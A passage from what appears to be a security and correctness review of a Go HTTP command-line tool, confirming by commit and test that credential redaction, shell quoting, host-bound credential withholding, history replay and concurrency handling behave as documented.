  re-sending the original bytes. `encodeLine`'s loop terminates on every path; `e.Request` is a
  value field and the `e.Response` branch copies, so the caller's entry is not mutated.
- **Cycle-3 finding 6 is closed.** The referenced-body rule now ships in all three documents
  (AGENT.md:214-222, README.md:276-284, DESIGN.md:275-279). `d762d58` holds on all three body
  origins: argv → bytes + `--data-raw`; `@file` → `@body.json` in *both* `request.body` and
  `--data-binary`; `-` → `@-` in both; `--data-binary '@./-'` in both for a file named `-`. A
  `client_secret` in a body file never reached stdout. `history replay` says `@-` on both fields.
  `displayRequest` copies rather than mutates.
- **No credential reached any surface.** A canary sweep over 12 invocations (json/pretty/tsv,
  dry-run, fail-on-error, off-set base URL, exit-5 basic, `auth check`, history/show/replay) with
  header, cookie, query, bearer and basic canaries found zero hits on stdout, stderr,
  `history.jsonl` or the spec cache, raw *and* percent-encoded, while the server confirmed the
  credentials actually went out. The credential-bearing write path is unchanged and still correct:
  `resolveParts` returns two pieces, `document.auth`/`cookies` write piece-by-piece, `grow` clears
  every abandoned array, `discard` clears the whole capacity on both paths, `basicPair` uses
  `strings.Cut`. No secrets in the diff or in any `testdata/`.
- **Shell quoting is not injectable.** `word.String()` single-quotes with `'\''` and double-quotes
  with `\`, `"`, `` ` ``, `$` escaped; a spec-supplied cookie name carrying `'` or `$` produces a
  correctly quoted word. Finding 2 is a terminal-control and column-structure issue, not shell
  injection.
- **`816ea21`'s gate is correctly placed** (before the host set, so a hostile document is exit 2
  wherever the call was pointed, `--dry-run` included), the location constants are one set
  (`operation.In*`), and unsupported schemes carry `In: header, Name: "Authorization"` so they
  cannot smuggle a hostile name. Its charset is the finding-2 defect; its placement is right.
- **`44c0264` is correct for every reachable path and its test is non-vacuous.** `openStore` refuses
  FIFOs, devices, directories and symlinks to any of them before the first byte;
  `TestAStoreThatIsAFIFOIsRefusedRatherThanWaitedOn` drives both readers from a goroutine against a
  timer and fails both ways. `Append` end-to-end refuses a FIFO store rather than blocking, and
  under `call` degrades to the stderr warning with the call's own exit code preserved.
- **`4440b68` is behaviourally correct.** `abandonWith` drops the descriptor at its deadline whether
  or not the flock was granted — proven at 60s through the production `waitForLock` by counting
  `/proc/self/fd`, and at 300ms through `abandonWith`. `f.Fd()` is resolved before the goroutine
  starts; the fd is captured by value; the pending flock holds its own reference to the open file
  description. Finding 12 is about the guard, not the code.
- **`24c177d` holds on the property it was written for.** With a body containing a real tab and a
  doubled backslash, the pretty line and the JSON `curl` field are byte-identical; the `history
  show` single-column body row is still escaped.
- **Host binding and the withholding chain are intact.** `--base-url` off the set → `call` exit 0
  with `credentials_withheld:[{scheme,reason,host}]` and `warnWithheld` on stderr, no
  `Authorization` in the emitted curl; `auth check` `"withheld":true` exit 0 for the same
  invocation; `history replay` to an off-set host refuses with exit 2. All three
  credential-resolving commands consult `request.HostSet` (`call.go:270`, `auth.go:132`,
  `history_replay.go:151`), and `newRedactors` is called exactly once per `RunE`.
- **`--dry-run` and the executed request produce identical `curl` strings**, credential symbolic in
  both. Query names and values are `url.QueryEscape`d on both the wire and display paths; path
  values are `url.PathEscape`d; base URLs go through `url.Parse`.
- **Envelope contracts match the documents.** `credentials_withheld` is
  `[{"scheme","reason","host"}]` with `host` in `host:port` form; `withheld` only when true;
  `supported` only when false and with no `source`; `truncated`/`headers_truncated` only when true;
  `schema: talaria/v1` on every payload including errors. Exit codes 2/3/4/5 match README.md:570-577
  on every path probed.
- **The §5a replay table holds on every row driven** except the header row (finding 7): stored body
  re-sent as `Inputs.Stdin` and displayed as `@-`; credentials dropped from the entry and
  re-resolved with the stderr warning; a stored off-set host refused with exit 2 naming
  `--allow-host`; `--allow-mutations` decided from the spec's method. The redaction-marker guard on
  query and header values *does* work — `Replayable.query` unescapes before `strings.Contains` — so
  finding 1 is scoped to the body path only.
- **`redact.body-paths` reaches the request body as documented** (`8c7ad1e`): a configured path
  rewrote the body in the store, in `request.body` and inside the emitted `--data-raw`, all three
  consistently, modulo finding 1's spelling.
- **No data races, no goroutine leaks, no fd leaks.** `go test -race ./...` green, 14/14 packages.
  The only shared mutable package state is `preflightCache`, every access under `preflightMu`.
  Three production goroutines, all with buffered channels so no send can strand; the flock
  goroutine's non-exit is correctly scoped to the descriptor rather than claimed away.
  `boundedBuffer` cannot race `cmd.Run()` — Go 1.26's `awaitGoroutines` receives on `goroutineErr`
  even on the `WaitDelay` arm. Only two production `exec` sites, both `CommandContext` +
  `WaitDelay = killGrace` + `isolate`. `context.Background()` appears once outside tests.
- **The recording-failure event chain fires**: an over-bound entry produced *"warning: the call was
  not recorded in history: the entry encodes to 305149 bytes …"* — refusal plus warning, no silent
  write. Every entry `Append` reported as recorded came back from `history`, `history show` (all
  three formats) and `history replay`, including a 180 KB line.
- **No environment parity problems.** `TALARIA_TEST*` appears only in `_test.go`; the only TTY
  detection is `internal/output/output.go:78`. No unbounded generator in any test; nothing in the
  suite waits out a production deadline (slowest corpus test 4.83s).
- **Nothing reintroduces `run`, `internal/gen` or the JUnit report.**
